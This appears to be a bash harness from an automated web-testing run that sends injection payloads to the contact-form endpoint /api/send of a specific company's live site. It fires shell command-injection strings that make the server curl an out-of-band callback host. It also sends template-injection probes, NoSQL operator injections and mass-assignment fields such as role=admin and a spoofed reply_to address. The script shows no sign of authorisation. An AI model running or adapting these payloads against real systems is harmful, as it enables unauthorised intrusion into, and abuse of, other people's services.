#!/bin/bash
# Differential oracle harness for POST /api/send — capture baseline then mutated variants
cd /work
U="https://www.infinitycapital.bh/api/send"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
HCMD=oob360914cfa39d.dau2p4ghgqag02k5euubogc5xu6hph3m973.oast.abhedi.co.in
HCMD=oob360914cfa39d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
HNOS=oobc900f1c49a0f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
O=tool_outputs/send_oracles; mkdir -p $O

send(){ # $1=label  $2..=extra curl args
  lbl=$1; shift
  code=$(curl -s -o $O/$lbl.body -w "%{http_code}" -A "$UA" -X POST "$U" "$@")
  sz=$(wc -c < $O/$lbl.body)
  echo "[$lbl] code=$code size=$sz :: $(head -c 220 $O/$lbl.body)"
  sleep 6
}

COMMON=(--data-urlencode "fname=ICMARKER7" --data-urlencode "lname=Tester" --data-urlencode "areacode=973"
        --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=icmarker7@example.com")

echo "########## BASELINE"
send base --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=ICMARKER7 body"

echo "########## CMDi (subject)"
send cmd1 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=\$(curl http://$HCMD/cmdi1)" --data-urlencode "msg=body"
send cmd2 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=x;curl http://$HCMD/cmdi2;" --data-urlencode "msg=body"
send cmd3 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=x\`curl http://$HCMD/cmdi3\`" --data-urlencode "msg=body"

echo "########## CMDi (msg)"
send cmd4 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=\$(curl http://$HCMD/cmdi4)"
send cmd5 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=x;curl http://$HCMD/cmdi5;"

echo "########## SSTI arithmetic marker"
send ssti1 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=\${7*7}" --data-urlencode "msg=body"
send ssti2 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject={{7*7}}" --data-urlencode "msg=body"
send ssti3 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=<%= 7*7 %>" --data-urlencode "msg=body"
send ssti4 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg={{7*7}}"

echo "########## NoSQLi operators"
send nos1 -H "Content-Type: application/json" --data '{"cname":{"$ne":null},"subject":"ICMARKER7","msg":"b","targets":"a@b.com","check":"on"}'
send nos2 -H "Content-Type: application/json" --data '{"cname":{"$gt":""},"subject":"ICMARKER7","msg":"b","targets":"a@b.com","check":"on"}'
send nos3 --data-urlencode 'cname[$ne]=x' --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=b" --data-urlencode "targets=a@b.com"

echo "########## Mass assignment / extra params"
send mass1 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=b" --data-urlencode "role=admin" --data-urlencode "isAdmin=true"
send mass2 --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=b" --data-urlencode "from=victim@x.com" --data-urlencode "reply_to=attacker@evil.com"
echo DONE
